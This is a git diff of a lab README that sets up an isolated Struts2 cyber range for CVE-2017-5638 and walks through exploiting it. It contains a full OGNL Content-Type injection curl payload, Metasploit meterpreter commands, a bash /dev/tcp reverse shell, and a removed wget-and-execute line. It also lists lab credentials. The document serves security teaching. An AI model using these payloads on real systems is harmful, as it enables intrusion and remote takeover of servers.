@@ -1,24 +1,25 @@
-# Deploy a vulnerable Struts2 server
-In this example, we demonstrate how to deploy a cyber attack range on the SPHERE platform that includes one attacker machine and one target machine.
+# Struts2 RCE (CVE-2017-5638) Lab
+
+This lab deploys an Apache Struts2 Showcase application (Struts 2.3.12) on Tomcat. The Jakarta Multipart parser fails to validate the `Content-Type` header, allowing OGNL expression injection that leads to remote code execution.
 
 ## Detailed Deploying Steps
 
 ### Deploy the Cyber Range Environment
 
-1. In the “Model Editor” interface of the SPHERE platform, deploy the following model.
+1. In the "Model Editor" interface of the SPHERE platform, deploy the following model.
     ```python
     from mergexp import *
 
-    # Create a network topology object
     net = Network('Single-Victim', addressing==ipv4, routing==static)
 
     attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
     victim = net.node('victim', image=='2404', proc.cores==2, memory.capacity==gb(2))
 
-    # Create a link connecting the three nodes
-    link = net.connect([attacker,victim])
+    link = net.connect([attacker, victim])
 
-    # Make this file a runnable experiment
+    link[attacker].socket.addrs = ip4('10.0.0.1/24')
+    link[victim].socket.addrs   = ip4('10.0.0.2/24')
+
     experiment(net)
     ```
 
@@ -26,106 +27,122 @@ In this example, we demonstrate how to deploy a cyber attack range on the SPHERE
 
 3. Activate the Reservation.
 
-4. In your Experiment Development Containers (XDCs), attach to the activation. If you used machines of Ubuntu 24.04, by default, the 32 GB disk allocated to a virtual machine is not automatically expanded/mounted to the root (/) filesystem, which can make the system unusable. On such machines, the following commands usually need to be executed manually:
+4. If the Ubuntu 24.04 root disk is not automatically expanded, run on the victim machine:
     ```
     sudo partprobe
     sudo resize2fs /dev/vda3
     ```
 
-    You can also run this [script](../initial_setup/resize-root-disk.md) on the XDC server to solve this issue.
-
-
 ### Deploy the Target Victim Machine
-We use Ansible to automatically configure the vulnerable target machine. In this attack scenario, our target is a vulnerable Apache Struts2 application.
 
-0. Before running the commands below, you need to [install Ansible](../setup_ansible/readme.md) first.
+0. [Install Ansible](../setup_ansible/readme.md) on your XDC before proceeding.
 
-1. Check the victim machine’s hostname and username (in most cases, the password is not required, so you may choose whether to include it). Then update the corresponding configuration in the [`struts2_lab/inventory.ini`](inventory.ini) file accordingly.
-    ``` ini
+1. The [`inventory.ini`](inventory.ini) is pre-configured to use SPHERE's DNS short name — no IP address lookup needed:
+    ```ini
     [struts2_vm]
-    struts2-target ansible_host=IP_ADDRESS ansible_user=USER_NAME ansible_become_pass=PASSWORD
+    struts2-target ansible_host=victim.infra ansible_user=lexuswang ansible_become_pass=lexuswang
 
     [struts2_vm:vars]
     ansible_python_interpreter=/usr/bin/python3
     ```
+    `victim.infra` automatically resolves to the victim's infranet address via SPHERE DNS. Update `ansible_user` and `ansible_become_pass` if your SPHERE username differs from `lexuswang`.
 
-2. Execute the following command
+2. Run the playbook:
     ```bash
     ansible-playbook -i inventory.ini struts2_target.yml --ask-become-pass
     ```
 
-    (Note: You may not need to type the password when deploying this on SPHERE since it does not require it. Simply just hit the "Enter" key.)
- 
-After the above commands are completed, you will see output information, including instructions on how to perform basic functional testing.
-
 ### Deploy the Attack Machine
-Please refer to this [doc](../attacker_setup/readme.md) to setup the attack machine.
 
+Please refer to this [doc](../attacker_setup/readme.md) to set up the attack machine.
+
+---
 
 ## Detailed Information about the Target System
 
-Service: Apache Struts2 Showcase Application
+**Service:** Apache Struts2 Showcase Application (Tomcat)
 
-Vulnerability: CVE-2017-5638 (S2-045)
+**Vulnerability:** CVE-2017-5638 (S2-045)
 
-Struts2 Version: 2.3.12 (vulnerable)
+**Struts2 Version:** 2.3.12 (vulnerable)
 
-Port: 8080
+**CVSS Score:** 10.0 Critical
 
-URL: http://{{ target_ip }}:8080/struts2-showcase/
+**Port:** 8080
 
-Service: systemctl status tomcat
+**Victim experiment network IP:** `10.0.0.2` (fixed in `merge_model.py`)
 
-### Exploitation Details
+**URL:** `http://10.0.0.2:8080/struts2-showcase/`
 
-Vulnerability Type: Remote Code Execution via Content-Type header
-Attack Vector: OGNL Expression Injection
+**Service management:**
+```bash
+systemctl status tomcat
+```
 
-Vulnerable Endpoints: ANY endpoint accepting multipart/form-data
+### How the vulnerability works
+
+The Jakarta Multipart parser in Apache Struts 2.3.x (before 2.3.32) does not properly handle malformed `Content-Type` headers. When a request with a crafted Content-Type containing an OGNL expression is sent to any endpoint that accepts `multipart/form-data`, the parser evaluates the expression — allowing arbitrary command execution on the server.
+
+---
 
 ## Testing (from attacker machine)
-You need to replace the target_ip to the real IP address to run the following tests.
 
-### Basic command execution test
+All commands run on the Kali attacker (`10.0.0.1`).
 
+### Step 1: Confirm the application is running
+
+```bash
+curl http://10.0.0.2:8080/struts2-showcase/
 ```
-curl -i -X POST http://{{ target_ip }}:8080/struts2-showcase/integration/saveGangster.action \
+
+### Step 2: Basic command execution via Content-Type injection
+
+```bash
+curl -i -X POST http://10.0.0.2:8080/struts2-showcase/integration/saveGangster.action \
 -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 ```
 
-### Metasploit Usage
+Replace `'#cmd='id''` with other commands to test: `whoami`, `cat /etc/passwd`, `uname -a`, etc.
 
-```
-use exploit/multi/http/struts2_content_type_ognl
-set RHOSTS {{ target_ip }}
-set RPORT 8080
-set TARGETURI /struts2-showcase/integration/saveGangster.action
-set PAYLOAD linux/x64/meterpreter/reverse_tcp
-set LHOST <your_ip>
-set LPORT 4444
+### Step 3: Metasploit
+
+```bash
+msfconsole -q -x "
+use exploit/multi/http/struts2_content_type_ognl;
+set RHOSTS 10.0.0.2;
+set RPORT 8080;
+set TARGETURI /struts2-showcase/integration/saveGangster.action;
+set PAYLOAD linux/x64/meterpreter/reverse_tcp;
+set LHOST 10.0.0.1;
+set LPORT 4444;
 exploit
+"
 ```
 
-### Additional Testing
+### Step 4: Reverse shell (manual)
 
-#### Simple command execution tests
-Replace '#cmd='id'' with:
-- '#cmd='whoami''
-- '#cmd='pwd''
-- '#cmd='cat /etc/passwd''
-- '#cmd='ls -la /tmp''
-- '#cmd='uname -a''
+```bash
+# Terminal 1: start listener on attacker
+nc -lvnp 4444
 
-#### Reverse shell example (update ATTACKER_IP/PORT)
-'#cmd='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1''
+# Terminal 2: trigger reverse shell via Content-Type injection
+# Replace '#cmd='id'' in the Step 2 curl command with:
+# '#cmd='bash -i >& /dev/tcp/10.0.0.1/4444 0>&1''
+```
 
-#### Download and execute
-'#cmd='wget http://ATTACKER_IP/payload.sh -O /tmp/p.sh && bash /tmp/p.sh''
+---
 
-### CREDENTIALS
+## Attack Chain
 
-SSH User: webuser
+1. **Recon:** Port scan identifies Tomcat on 8080, Struts2 Showcase app
+2. **Exploit:** Send crafted Content-Type header with OGNL expression
+3. **RCE:** Command output returned in HTTP response body
+4. **Shell:** Reverse shell or Meterpreter session established
 
-Password: password123
+---
 
-Root access: sudo su (if webuser is in sudoers)
+## Credentials
+
+| Account | Password |
+|---------|----------|
+| SSH `webuser` | `password123` |
